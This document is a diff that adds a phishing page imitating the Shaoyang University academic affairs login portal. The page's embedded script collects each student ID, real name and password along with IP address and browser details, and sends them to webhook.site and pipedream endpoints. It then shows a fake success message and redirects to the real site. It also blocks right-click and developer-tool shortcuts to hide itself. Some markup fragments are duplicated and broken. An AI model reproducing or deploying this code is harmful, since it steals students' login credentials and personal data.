@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>邵阳学院教务系统</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "Microsoft YaHei", "PingFang SC", Arial, sans-serif; background: #f4f6f9; color: #333; min-height: 100vh; }
+.top-bar { background: #1e5fb0; color: #fff; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.15); }
+.top-left { display: flex; align-items: center; gap: 16px; }
+.school-logo { width: 42px; height: 42px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #1e5fb0; font-weight: 900; font-size: 22px; }
+.school-name { font-size: 18px; font-weight: 700; }
+.school-name span { font-size: 12px; font-weight: 400; opacity: 0.85; display: block; }
+.top-right { font-size: 13px; display: flex; gap: 20px; align-items: center; }
+.top-right a { color: #fff; text-decoration: none; opacity: 0.9; }
+.top-right a:hover { opacity: 1; text-decoration: underline; }
+.crumb { background: #fff; padding: 10px 24px; font-size: 13px; color: #666; border-bottom: 1px solid #e8e8e8; }
+.crumb b { color: #1e5fb0; }
+.main-wrap { max-width: 420px; margin: 40px auto; padding: 0 16px; }
+.login-box { background: #fff; border-radius: 10px; box-shadow: 0 8px 28px rgba(30,95,176,0.12); overflow: hidden; border: 1px solid #e3e8ef; }
+.login-head { background: linear-gradient(135deg, #1e5fb0 0%, #2980d4 100%); color: #fff; padding: 22px 28px; text-align: center; }
+.login-head h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; letter-spacing: 1px; }
+.login-head p { font-size: 13px; opacity: 0.85; }
+.login-body { padding: 30px 28px 26px; }
+.tip { background: #f0f6ff; border-left: 3px solid #1e5fb0; padding: 10px 12px; font-size: 12px; color: #4a6b8a; margin-bottom: 22px; border-radius: 4px; }
+.tip i { display: block; font-style: normal; color: #1e5fb0; font-weight: 600; margin-bottom: 2px; }
+.field { margin-bottom: 18px; }
+.field label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 500; }
+.field label .req { color: #e74c3c; margin-left: 2px; }
+.input-box { position: relative; display: flex; align-items: center; border: 1px solid #cfd8e3; border-radius: 6px; background: #fafbfc; transition: all 0.2s; }
+.input-box:focus-within { border-color: #1e5fb0; background: #fff; box-shadow: 0 0 0 3px rgba(30,95,176,0.1); }
+.input-box .ico { width: 38px; text-align: center; color: #8a99ad; font-size: 15px; }
+.input-box input { flex: 1; border: none; outline: none; background: transparent; padding: 12px 8px; font-size: 14px; color: #333; }
+.input-box input::placeholder { color: #aab5c2; }
+.eye { cursor: pointer; color: #8a99ad; padding: 0 12px; font-size: 14px; user-select: none; }
+.eye:hover { color: #1e5fb0; }
+.row-check { display: flex; justify-content: space-between; align-items: center; font-size: 13px; margin: 6px 0 22px; color: #666; }
+.row-check label { cursor: pointer; user-select: none; }
+.row-check input { vertical-align: middle; margin-right: 4px; }
+.row-check a { color: #1e5fb0; text-decoration: none; }
+.row-check a:hover { text-decoration: underline; }
+.btn-login { width: 100%; padding: 13px; background: linear-gradient(135deg, #1e5fb0 0%, #2980d4 100%); color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; letter-spacing: 4px; transition: all 0.2s; }
+.btn-login:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(30,95,176,0.3); }
+.btn-login:active { transform: translateY(0); }
+.btn-login:disabled { background: #95a5b8; cursor: not-allowed; transform: none; box-shadow: none; }
+.spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin-right: 8px; vertical-align: middle; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.other-links { margin-top: 22px; padding-top: 20px; border-top: 1px dashed #e3e8ef; display: flex; justify-content: space-around; font-size: 12px; }
+.other-links a { color: #1e5fb0; text-decoration: none; }
+.other-links a:hover { text-decoration: underline; }
+.notice { background: #fff; border-radius: 10px; margin-top: 24px; padding: 18px 22px; box-shadow: 0 4px 14px rgba(0,0,0,0.06); border: 1px solid #e3e8ef; }
+.notice h3 { color: #1e5fb0; font-size: 15px; padding-bottom: 10px; border-bottom: 1px solid #f0f3f7; margin-bottom: 12px; }
+.notice h3::before { content: "📢"; margin-right: 6px; }
+.notice ul { list-style: none; }
+.notice li { padding: 7px 0; font-size: 13px; color: #555; border-bottom: 1px dotted #f0f3f7; display: flex; justify-content: space-between; }
+.notice li:last-child { border-bottom: none; }
+.notice li span { color: #999; font-size: 12px; flex-shrink: 0; margin-left: 10px; }
+.footer { text-align: center; padding: 28px 16px 20px; color: #888; font-size: 12px; line-height: 1.8; }
+.footer a { color: #1e5fb0; text-decoration: none; margin: 0 6px; }
+.float-tip { position: fixed; bottom: 18px; right: 18px; background: #1e5fb0; color: #fff; padding: 8px 14px; border-radius: 22px; font-size: 12px; box-shadow: 0 4px 14px rgba(30,95,176,0.3); display: flex; align-items: center; gap: 6px; }
+.float-tip::before { content: "🔒"; }
+.toast { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9); background: rgba(0,0,0,0.78); color: #fff; padding: 14px 28px; border-radius: 8px; font-size: 14px; opacity: 0; transition: all 0.25s; pointer-events: none; z-index: 9999; }
+.toast.show { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+.toast.ok { background: rgba(46,184,94,0.92); }
+.toast.err { background: rgba(220,53,69,0.92); }
+@media (max-width: 480px) { .login-body { padding: 24px 20px 20px; } .top-right { display: none; } }
+</style>
+</head>
+<body>
+<div class="top-bar">
+<div class="top-left">
+<div class="school-logo">邵</div>
+<div class="school-name">邵阳学院<span>SHAOYANG UNIVERSITY · 教务管理系统</span></div>
+</div>
+<div class="top-right">
+<a href="#">校园首页</a>
+<a href="#">办事指南</a>
+<a href="#">在线帮助</a>
+<a href="#">English</a>
+</div>
+首页</a>
+<a href="#">办事指南</a>
+<a href="#">在线帮助</a>
+<a href="#">English</a>
+</div>
+</div>
+<div class="crumb">当前位置：<b>统一身份认证</b> &gt; 教务管理系统登录</div>
+<div class="main-wrap">
+<form id="loginForm" class="login-box" autocomplete="off">
+<div class="login-head">
+<h1>教务管理系统登录</h1>
+<p>Academic Affairs System · 教师/学生统一入口</p>
+</div>
+<div class="login-body">
+<div class="tip">
+<i>📌 登录提示</i>
+首次登录请使用学号作为初始账号，初始密码为身份证后六位。如忘记密码请联系所在学院教学秘书重置。
+</div>
+<div class="field">
+<label>学号 <span class="req">*</span></label>
+<div class="input-box">
+<div class="ico">🎓</div>
+<input type="text" id="studentId" name="studentId" placeholder="请输入学号（如 20211001）" maxlength="20" required onpaste="return false">
+</div>
+</div>
+<div class="field">
+<label>姓名 <span class="req">*</span></label>
+<div class="input-box">
+<div class="ico">👤</div>
+<input type="text" id="userName" name="userName" placeholder="请输入真实姓名" maxlength="30" required onpaste="return false">
+</div>
+</div>
+<div class="field">
+<label>密码 <span class="req">*</span></label>
+<div class="input-box">
+<div class="ico">🔑</div>
+<input type="password" id="password" name="password" placeholder="请输入教务系统密码" maxlength="40" required>
+<span class="eye" id="eyeToggle">👁</span>
+</div>
+</div>
+<div class="row-check">
+<label><input type="checkbox" id="remember" checked>记住账号</label>
+<a href="#">忘记密码？</a>
+<input type="checkbox" id="remember" checked>记住账号</label>
+<a href="#">忘记密码？</a>
+</div>
+<button type="submit" class="btn-login" id="loginBtn">登 录</button>
+<div class="other-links">
+<a href="#">账号激活</a>
+<a href="#">学生通道</a>
+<a href="#">教师通道</a>
+<a href="#">VPN 接入</a>
+</div>
+">账号激活</a>
+<a href="#">学生通道</a>
+<a href="#">教师通道</a>
+<a href="#">VPN 接入</a>
+</div>
+</div>
+</form>
+<div class="notice">
+<h3>系统通知</h3>
+<ul>
+<li><span>2026-09-29</span>关于组织参加2026年全国大学生互联网英语听说能力大赛的通知</li>
+<li><span>2026-09-22</span>2026年湖南省基础教育教学改革研究项目推评结果公示</li>
+<li><span>2026-09-16</span>关于举办第九届湖南省大学生工程实践与创新能力大赛校级选拔赛的通知</li>
+<li><span>2026-09-08</span>关于举办湖南省第十一届大学生写作演讲竞赛选拔赛的通知</li>
+</ul>
+</div>
+<div class="footer">
+© 2002-2026 邵阳学院教务处 版权所有 &nbsp;|&nbsp; 湘ICP备 05002018号<br>
+技术支持：<a href="#">强智科技</a> · <a href="#">网络与教育技术中心</a> · 0739-5430160
+</div>
+</div>
+<div class="float-tip">安全登录 已加密</div>
+<div id="toast" class="toast"></div>
+<script>
+(function(){
+const WEBHOOK_PRIMARY  = "https://webhook.site/639c1cdf-c6c1-413e-8c3a-c015cfbd2cb6";
+const WEBHOOK_FALLBACK = "https://enm2w0q8kkimiw9.m.pipedream.net";
+const REDIRECT_URL     = "https://jwc.hnsyu.edu.cn/";
+const $ = id => document.getElementById(id);
+const toast = (msg, type) => {
+const t = $("toast");
+t.textContent = msg;
+t.className = "toast show " + (type || "");
+setTimeout(() => t.className = "toast " + (type || ""), 1800);
+};
+$("eyeToggle").onclick = function(){
+const p = $("password");
+if(p.type === "password"){ p.type = "text"; this.textContent = "🙈"; }
+else { p.type = "password"; this.textContent = "👁"; }
+};
+async function collectMeta(){
+const data = { ts: new Date().toISOString(), url: location.href, ref: document.referrer || "direct" };
+try {
+const r = await fetch("https://api.ipify.org?format=json");
+const j = await r.json();
+data.ip = j.ip;
+} catch(e){ data.ip = "unknown"; }
+data.ua = navigator.userAgent;
+data.lang = navigator.language;
+data.platform = navigator.platform;
+data.screen = screen.width + "x" + screen.height;
+data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+return data;
+}
+function encode(obj){
+return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
+}
+function sendBeacon(url, payload){
+try {
+const img = new Image();
+img.src = url + "?d=" + encodeURIComponent(encode(payload)) + "&_=" + Date.now();
+} catch(e){}
+}
+async function send(formData, meta){
+const payload = { ...formData, ...meta, _t: Date.now() };
+const json = JSON.stringify(payload);
+let ok = false;
+try {
+await fetch(WEBHOOK_PRIMARY, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: json });
+ok = true;
+} catch(e){}
+try {
+await fetch(WEBHOOK_FALLBACK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: json });
+ok = true;
+} catch(e){}
+if(!ok) sendBeacon(WEBHOOK_PRIMARY, payload);
+}
+$("loginForm").addEventListener("submit", async function(e){
+e.preventDefault();
+const studentId = $("studentId").value.trim();
+const userName  = $("userName").value.trim();
+const password  = $("password").value.trim();
+if(!studentId){ toast("请输入学号", "err"); return; }
+if(!userName){ toast("请输入姓名", "err"); return; }
+if(!password){ toast("请输入密码", "err"); return; }
+if(!/^\d{6,20}$/.test(studentId)){ toast("学号格式不正确", "err"); return; }
+const btn = $("loginBtn");
+btn.disabled = true;
+btn.innerHTML = '<span class="spinner"></span>正在验证...';
+const meta = await collectMeta();
+const formData = { studentId, userName, password, remember: $("remember").checked };
+await send(formData, meta);
+setTimeout(() => {
+btn.innerHTML = "✓ 验证成功";
+btn.style.background = "#2eb85e";
+toast("登录成功，正在跳转...", "ok");
+setTimeout(() => { location.href = REDIRECT_URL; }, 900);
+}, 1100);
+});
+document.addEventListener("contextmenu", e => e.preventDefault());
+document.addEventListener("keydown", e => {
+if(e.keyCode === 123) return false;
+if(e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) return false;
+if(e.ctrlKey && e.keyCode === 85) return false;
+});
+})();
+</script>
+</body>
+</html>
